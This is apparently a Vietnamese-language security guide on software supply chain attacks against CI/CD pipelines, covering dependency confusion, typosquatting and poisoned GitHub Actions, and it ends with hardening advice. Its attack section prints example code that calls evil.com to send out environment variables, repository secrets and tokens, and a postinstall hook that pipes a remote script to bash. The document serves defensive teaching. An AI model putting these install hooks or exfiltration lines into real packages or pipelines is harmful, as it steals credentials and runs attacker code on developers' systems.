# Supply Chain Attacks (CI/CD Pipeline)

> **OWASP Top 10:2025**: A03 – Software Supply Chain Failures | **CWE**: CWE-829 | **Nguồn**: OWASP, Snyk, SLSA Framework

## 🧱 Kiến thức Nền tảng

Chuỗi cung ứng phần mềm (Software Supply Chain) bao gồm toàn bộ quy trình từ khi viết code đến khi deploy sản phẩm: source code → dependencies → build pipeline → artifact registry → deployment. Mỗi mắt xích trong chuỗi này đều có thể bị tấn công.

Trong phát triển phần mềm hiện đại, một ứng dụng trung bình sử dụng **80-90% code từ thư viện bên thứ ba**. Các package manager như npm, PyPI, Maven tự động tải và cài đặt hàng trăm transitive dependencies. CI/CD pipeline (GitHub Actions, GitLab CI, Jenkins) tự động hóa quá trình build, test và deploy — tạo ra bề mặt tấn công rộng lớn.

Một pipeline CI/CD điển hình hoạt động như sau:

```yaml
# .github/workflows/build.yml - Normal CI/CD pipeline
name: Build and Deploy
on: [push]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4        # Pull source code
      - run: npm install                  # Install dependencies from registry
      - run: npm run build                # Build application
      - run: npm test                     # Run tests
      - run: docker build -t myapp .      # Create container image
      - run: docker push registry/myapp   # Push to artifact registry
```

Mỗi bước trên đều là một điểm mà attacker có thể can thiệp: từ việc chèn mã độc vào dependency, đến việc compromise GitHub Action, hay thay đổi base Docker image.

## 🔍 Mô tả lỗ hổng

Supply Chain Attack nhắm vào các thành phần **bên ngoài** mà developer tin tưởng và sử dụng mà không kiểm tra kỹ. Thay vì tấn công trực tiếp vào ứng dụng, attacker nhắm vào:

- **Dependency Confusion**: Tạo package trùng tên với internal package trên public registry với version cao hơn, khiến build system tự động tải package độc hại.
- **Typosquatting**: Đăng ký package có tên gần giống package phổ biến (ví dụ: `lodahs` thay vì `lodash`).
- **Compromised Maintainer**: Chiếm quyền tài khoản maintainer của package phổ biến.
- **Malicious CI/CD Actions**: Tạo hoặc compromise GitHub Actions/GitLab CI templates.

## ⚔️ Cơ chế tấn công

### 1. Dependency Confusion Attack

```python
# setup.py - Malicious package uploaded to public PyPI
# Package name matches internal company package "mycompany-auth"
from setuptools import setup
import os

# Exfiltrate environment variables during install
os.system(f"curl https://evil.com/collect?data=$(env | base64)")

setup(
    name="mycompany-auth",       # Same name as internal package
    version="99.0.0",            # Higher version forces auto-upgrade
    packages=["mycompany_auth"],
)
```

### 2. Typosquatting Attack

```bash
# Attacker registers similar package names on npm
npm publish colo-rs        # Target: colors (180M downloads/week)
npm publish reqeusts       # Target: requests
npm publish electorn       # Target: electron
```

### 3. CI/CD Pipeline Poisoning

```yaml
# Malicious GitHub Action that steals secrets
name: "Fake Code Quality Check"
runs:
  using: "composite"
  steps:
    - run: |
        # Steal all repository secrets and tokens
        curl -X POST https://evil.com/exfil \
          -d "secrets=${{ toJSON(secrets) }}" \
          -d "github_token=${{ github.token }}"
      shell: bash
```

### 4. Malicious postinstall Script

```json
{
  "name": "totally-legit-package",
  "version": "1.0.0",
  "scripts": {
    "postinstall": "node -e \"require('child_process').exec('curl https://evil.com/shell.sh | bash')\""
  }
}
```

## 🛡️ Biện pháp phòng thủ

1. **Lock dependencies**: Luôn commit `package-lock.json`, `Pipfile.lock`, `go.sum` và verify integrity hashes.
2. **Pin versions cụ thể**: Không dùng `^` hoặc `~` ranges, pin exact version.
3. **Scoped registries**: Cấu hình `.npmrc` để internal packages chỉ tải từ private registry.
4. **Pin CI/CD actions theo SHA**: Sử dụng commit hash thay vì version tag.
5. **Audit thường xuyên**: Chạy `npm audit`, `pip-audit`, `trivy` trong pipeline.
6. **SLSA Framework**: Áp dụng Supply-chain Levels for Software Artifacts để xác minh provenance.

## 💻 Code Example

```yaml
# ❌ VULNERABLE: Unpinned dependencies and actions
name: Build
on: [push]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@main           # Mutable tag - can be hijacked
      - uses: some-random-org/action@v1       # Unverified third-party action
      - run: npm install                       # No integrity verification
      - run: pip install mycompany-auth        # No source registry specified
```

```yaml
# ✅ SECURE: Pinned, verified, and scoped
name: Build
on: [push]
jobs:
  build:
    runs-on: ubuntu-latest
    permissions:
      contents: read                           # Minimal permissions
    steps:
      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11  # Pinned by SHA
      - uses: actions/setup-node@60edb5dd545a775178f52524783378180af0d1f8
        with:
          node-version-file: '.nvmrc'
          registry-url: 'https://npm.mycompany.com'  # Private registry for scoped packages
      - run: npm ci --ignore-scripts           # Use lockfile, skip postinstall scripts
      - run: npm audit --audit-level=high      # Fail on high-severity vulnerabilities
      - run: |
          # Verify SLSA provenance of critical dependencies
          slsa-verifier verify-artifact myapp.tar.gz \
            --provenance-path myapp.intoto.jsonl \
            --source-uri github.com/myorg/myapp
```

```ini
# .npmrc - Scoped registry configuration
@mycompany:registry=https://npm.mycompany.com/
//npm.mycompany.com/:_authToken=${NPM_TOKEN}
engine-strict=true
ignore-scripts=true
```

## 📚 Nguồn tham khảo
- OWASP: https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/
- SLSA Framework: https://slsa.dev/
- CWE-829: https://cwe.mitre.org/data/definitions/829.html
- Snyk – Dependency Confusion: https://snyk.io/blog/detect-prevent-dependency-confusion-attacks-npm-supply-chain-security/
